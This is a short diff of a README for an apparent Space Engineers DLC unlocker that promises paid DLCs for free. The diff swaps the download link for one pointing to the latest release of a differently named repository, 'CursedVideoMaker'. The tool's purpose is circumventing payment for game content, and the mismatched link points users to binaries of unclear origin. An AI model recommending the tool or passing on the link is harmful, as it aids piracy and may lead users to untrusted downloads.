@@ -11,7 +11,7 @@ This repository allows you to get the space engineers dlcs for free, if there ar
 5. Replace all
 6. Done!
 
-[Download](https://github.com/wrefgtzweve/SpaceEngineersDLCUnlocker/archive/refs/heads/master.zip)
+- **[Download latest version](https://github.com/wrefgtzweve/CursedVideoMaker/releases/latest)**
 
 # FAQ
 ### Can you unlock all the premium skins too?
